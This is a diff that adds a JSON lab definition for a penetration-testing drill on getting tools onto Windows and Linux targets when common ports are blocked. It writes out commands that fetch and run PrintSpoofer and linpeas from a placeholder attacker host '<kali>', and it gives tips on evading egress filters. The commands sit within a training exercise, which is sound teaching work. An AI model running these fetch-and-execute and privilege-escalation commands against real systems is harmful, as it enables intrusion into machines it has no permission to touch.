@@ -1,0 +1,117 @@
+{
+  "id": "file-transfer-under-pressure",
+  "title": "File Transfer Under Pressure",
+  "category": "technique-drill",
+  "source": ["All labs"],
+  "designed_by": "ai-composite",
+  "description": "Practice file transfer methods when common ports blocked. WIN-TARGET: certutil, PowerShell IWR, SMB server, bitsadmin. LIN-TARGET: curl, wget, nc, base64, python http.server, scp.",
+
+  "introduction": "When 80/443 are blocked, you need alternatives—this drill ensures you can always get tools onto the target to continue the chain.",
+  "mental_model": "Think fallback chain: try HTTP first, then SMB, then certutil/IWR. Have multiple methods ready; one will work.",
+  "key_principles": [
+    "certutil and IWR bypass many egress filters",
+    "SMB server on Kali works when target can reach you",
+    "bitsadmin for large or stubborn transfers",
+    "Linux: curl, wget, nc, base64—know them all",
+    "Test transfer before exploiting"
+  ],
+
+  "indicators": {
+    "difficulty": 3,
+    "cognitive_load": 2,
+    "enumeration_depth": 1,
+    "rabbit_hole_risk": 1,
+    "time_pressure": 2
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0011"],
+    "techniques": [
+      {"id": "T1105", "name": "Ingress Tool Transfer"},
+      {"id": "T1059.001", "name": "PowerShell"},
+      {"id": "T1059.003", "name": "Windows Command Shell"}
+    ]
+  },
+
+  "kill_chain_phases": ["T3-NonWeb-Access", "T4a-Linux-PrivEsc", "T4b-Win-PrivEsc"],
+
+  "environment": {
+    "machine_count": 2,
+    "network_count": 1,
+    "os_distribution": {"windows": 1, "linux": 1},
+    "has_ad": false,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "certutil", "powershell", "iwr", "bitsadmin", "smb",
+    "curl", "wget", "nc", "base64", "python-http-server", "scp"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [6, 12, 16, 17],
+    "pattern_frequency": "very-high",
+    "recommended_order": 8
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "10.10.10.0/24", "label": "External"}
+  ],
+
+  "machines": [
+    {
+      "id": "win-target",
+      "label": "WIN-TARGET",
+      "ip": "10.10.10.50",
+      "os": "Windows",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["evil-winrm -i 10.10.10.50 -u admin -p '<password>'"]},
+        {"port": 445, "name": "SMB", "version": "", "vulnerabilities": [{"type": "auth", "summary": "SMB share for transfer", "leads_to": "transfer"}], "commands": ["impacket-smbserver share . -smb2support"]}
+      ],
+      "privesc": [{"from": "admin", "to": "SYSTEM", "technique": "PrintSpoofer", "commands": ["certutil -urlcache -split -f http://<kali>/PrintSpoofer64.exe p.exe", "p.exe -i -c cmd"]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "lin-target",
+      "label": "LIN-TARGET",
+      "ip": "10.10.10.51",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 22, "name": "SSH", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["ssh user@10.10.10.51"]},
+        {"port": 80, "name": "HTTP", "version": "Apache", "vulnerabilities": [{"type": "rce", "summary": "Web shell", "leads_to": "www-data"}], "commands": []}
+      ],
+      "privesc": [{"from": "user", "to": "root", "technique": "SUID or sudo", "commands": ["curl http://<kali>/linpeas.sh -o /tmp/lp.sh", "chmod +x /tmp/lp.sh", "/tmp/lp.sh"]}],
+      "credentials": [],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [],
+
+  "attack_paths": [
+    {
+      "id": "path-win",
+      "name": "WIN-TARGET Transfer Methods",
+      "color": "#6bb8cc",
+      "steps": ["win-target"],
+      "description": "certutil, IWR, SMB, bitsadmin - transfer linpeas/PrintSpoofer"
+    },
+    {
+      "id": "path-lin",
+      "name": "LIN-TARGET Transfer Methods",
+      "color": "#e8a87c",
+      "steps": ["lin-target"],
+      "description": "curl, wget, nc, base64, python -m http.server, scp"
+    }
+  ]
+}
